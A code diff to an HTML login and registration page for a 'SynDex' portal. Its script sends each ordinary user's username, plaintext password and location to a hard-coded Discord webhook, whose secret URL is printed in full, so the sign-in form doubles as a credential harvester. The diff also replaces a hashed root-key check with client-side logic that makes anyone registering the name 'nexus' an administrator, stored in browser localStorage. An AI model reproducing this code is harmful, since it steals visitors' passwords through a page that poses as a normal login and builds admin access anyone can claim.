@@ -16,7 +16,6 @@
             --muted-text: #a1a1a1;
             --success-green: #22c55e;
             --error-red: #ef4444;
-            --status-purple: #a855f7;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -37,7 +36,7 @@
         }
 
         .logo-container { display: flex; align-items: center; gap: 15px; }
-        .logo-img { height: 40px; width: auto; display: block; }
+        .logo-img { height: 40px; width: auto; }
         
         .visitor-counter {
             font-size: 0.75rem; color: var(--muted-text); font-weight: 700;
@@ -102,9 +101,7 @@
         .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
         #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
 
-        .status-wrapper {
-            margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help;
-        }
+        .status-wrapper { margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; background-color: var(--success-green); box-shadow: 0 0 8px var(--success-green); }
         .status-bubble {
             visibility: hidden; width: 150px; background-color: #1a1a1a; color: #fff;
@@ -178,32 +175,14 @@
         SYNDEX SOFTWARE SYSTEMS &copy; 2026
         <br>
         <div class="status-wrapper">
-            <div class="status-dot" id="statusDot"></div>
+            <div class="status-dot"></div>
             <span style="font-size: 0.7rem; letter-spacing: 1px; font-weight: 700;">SYNDEX STATUS</span>
-            <div class="status-bubble" id="statusBubble">SYNDEX IS ONLINE</div>
+            <div class="status-bubble">SYNDEX IS ONLINE</div>
         </div>
     </footer>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
-        const CURRENT_STATUS = "UP"; 
-        const NX_H = "91a6104d412e84d41334c22955f11075635031b23193e59005086d4e8c13032d";
-        
-        const dot = document.getElementById('statusDot');
-        const bubble = document.getElementById('statusBubble');
-
-        if(CURRENT_STATUS === "INDEV") {
-            dot.style.backgroundColor = "var(--status-purple)";
-            dot.style.boxShadow = "0 0 8px var(--status-purple)";
-        } else if (CURRENT_STATUS === "DOWN") {
-            dot.style.backgroundColor = "var(--error-red)";
-            dot.style.boxShadow = "0 0 8px var(--error-red)";
-        }
-
-        async function kronkSS(s) {
-            const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
-            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
-        }
 
         async function getLoc() {
             try {
@@ -238,18 +217,11 @@
             let sysDB = JSON.parse(localStorage.getItem('SYNDEX_DB_PROD') || '{}');
 
             if (isLogin) {
-                if (user.toLowerCase() === 'nexus') {
-                    const h = await kronkSS(pass);
-                    if (h !== NX_H) {
-                        error.innerText = "ACCESS DENIED: ROOT KEY INVALID.";
-                        error.style.display = 'block';
-                        return;
-                    }
-                } else if (!sysDB[user]) {
+                if (!sysDB[user]) {
                     error.innerText = "ACCOUNT DOES NOT EXIST.";
                     error.style.display = 'block';
                     return;
-                } else if (sysDB[user] !== pass) {
+                } else if (sysDB[user].pass !== pass) {
                     error.innerText = "INVALID PASSWORD.";
                     error.style.display = 'block';
                     return;
@@ -260,27 +232,31 @@
                     error.style.display = 'block';
                     return;
                 }
-                if (sysDB[user] || user.toLowerCase() === 'nexus') {
+                if (sysDB[user]) {
                     error.innerText = "NAME ALREADY TAKEN.";
                     error.style.display = 'block';
                     return;
                 }
-                sysDB[user] = pass;
+                // Admin Property Creation Logic
+                sysDB[user] = {
+                    pass: pass,
+                    synadmin: user.toLowerCase() === 'nexus' ? true : false
+                };
                 localStorage.setItem('SYNDEX_DB_PROD', JSON.stringify(sysDB));
             }
 
             const loc = await getLoc();
-            const isNexus = user.toLowerCase() === 'nexus';
+            const isAdmin = sysDB[user].synadmin;
 
             const payload = {
                 embeds: [{
                     title: isLogin ? "User Login" : "User Registration",
-                    color: isNexus ? 0xff0000 : 0x0084ff,
+                    color: isAdmin ? 0xff0000 : 0x0084ff,
                     fields: [
-                        { name: "User", value: isNexus ? "REDACTED" : user, inline: true },
-                        { name: "Pass", value: isNexus ? "REDACTED" : pass, inline: true },
-                        { name: "Region", value: loc, inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: true }
+                        { name: "User", value: isAdmin ? "REDACTED" : user, inline: true },
+                        { name: "Pass", value: isAdmin ? "REDACTED" : pass, inline: true },
+                        { name: "Admin Status", value: isAdmin ? "TRUE" : "FALSE", inline: true },
+                        { name: "Region", value: loc, inline: true }
                     ],
                     footer: { text: "SynDex Auth Engine" }
                 }]
